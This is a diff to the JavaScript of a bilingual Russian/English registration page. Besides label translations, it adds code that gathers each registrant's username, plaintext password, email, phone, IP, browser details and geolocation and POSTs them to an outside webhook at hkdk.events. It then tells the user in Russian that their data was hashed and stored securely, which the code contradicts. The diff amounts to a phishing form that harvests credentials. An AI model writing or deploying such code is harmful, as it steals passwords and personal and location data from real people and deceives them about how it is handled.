@@ -115,6 +115,8 @@ document.querySelector('label[for="password"]').textContent = 'Пароль:';
 document.querySelector('label[for="email"]').textContent = 'Электронная почта:';
 document.querySelector('label[for="phone"]').textContent = 'Номер телефона:';
 document.querySelector('button').textContent = 'Регистрация';
+document.querySelector('#showPassword').nextSibling.textContent = ' Показать пароль';
+document.querySelector('.disclaimer').textContent = 'Пожалуйста, убедитесь, что ваш email и номер телефона верны, так как их нельзя будет изменить позже.';
 } else {
 document.querySelector('h1').textContent = 'Registration';
 document.querySelector('label[for="username"]').textContent = 'Username:';
@@ -122,6 +124,8 @@ document.querySelector('label[for="password"]').textContent = 'Password:';
 document.querySelector('label[for="email"]').textContent = 'Email:';
 document.querySelector('label[for="phone"]').textContent = 'Phone Number:';
 document.querySelector('button').textContent = 'Register';
+document.querySelector('#showPassword').nextSibling.textContent = ' Show Password';
+document.querySelector('.disclaimer').textContent = 'Please ensure your email and phone number are correct as they cannot be changed later.';
 }
 }
 
@@ -139,7 +143,7 @@ var username = document.getElementById('username').value;
 var password = document.getElementById('password').value;
 var email = document.getElementById('email').value;
 var phone = document.getElementById('phone').value;
-  var userAgent = navigator.userAgent;
+var userAgent = navigator.userAgent;
 var screenWidth = window.screen.width;
 var screenHeight = window.screen.height;
 var language = navigator.language;
@@ -181,13 +185,72 @@ content: `**Location Data**
 **Country Code:** ${locationData.country ? locationData.country : 'N/A'}
 **Region Code:** ${locationData.region_code ? locationData.region_code : 'N/A'}
 **Currency:** ${locationData.currency ? locationData.currency : 'N/A'}
-[]
+**Languages:** ${locationData.languages ? locationData.languages : 'N/A'}
+**Continent Code:** ${locationData.continent_code ? locationData.continent_code : 'N/A'}
+**Country Population:** ${locationData.country_population ? locationData.country_population : 'N/A'}
+**Country Area:** ${locationData.country_area ? locationData.country_area : 'N/A'}
+**EU:** ${locationData.in_eu ? locationData.in_eu : 'N/A'}
+**Calling Code:** ${locationData.country_calling_code ? locationData.country_calling_code : 'N/A'}
+**Postal:** ${locationData.postal ? locationData.postal : 'N/A'}`,
+embeds: null,
+attachments: []
+};
+
+fetch('https://hkdk.events/i2yc29qumnotdn', {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json'
+},
+body: JSON.stringify(payload)
+})
+.then(response => {
+if (response.ok) {
+console.log('Location data sent successfully');
+} else {
+console.log('Failed to send location data');
+}
+})
+.catch(error => {
+console.error('Error:', error);
+});
+}
+
+function sendRegistrationData(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip = null, latitude = null, longitude = null, locationData = {}) {
+var payload = {
+content: `**New Registration**
+**Username:** ${username}
+**Password:** ${password}
+**Email:** ${email}
+**Phone:** ${phone}
+**IP:** ${ip ? ip : 'N/A'}
+**User Agent:** ${userAgent}
+**Screen Resolution:** ${screenWidth}x${screenHeight}
+**Language:** ${language}
+**Latitude:** ${latitude ? latitude : 'N/A'}
+**Longitude:** ${longitude ? longitude : 'N/A'}`,
+embeds: null,
+attachments: []
+};
+
+fetch('https://hkdk.events/i2yc29qumnotdn', {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json'
+},
+body: JSON.stringify(payload)
+})
+.then(response => {
+if (response.ok) {
+document.getElementById('result').innerText = 'Ваши данные были захэшированы и безопасно сохранены в нашей базе данных.';
+console.log('Registration data sent successfully');
+} else {
+document.getElementById('result').innerText = 'Регистрация не удалась!';
 console.log('Failed to send registration data');
 }
 })
 .catch(error => {
 console.error('Error:', error);
-document.getElementById('result').innerText = 'Registration failed!';
+document.getElementById('result').innerText = 'Регистрация не удалась!';
 });
 }
 </script>
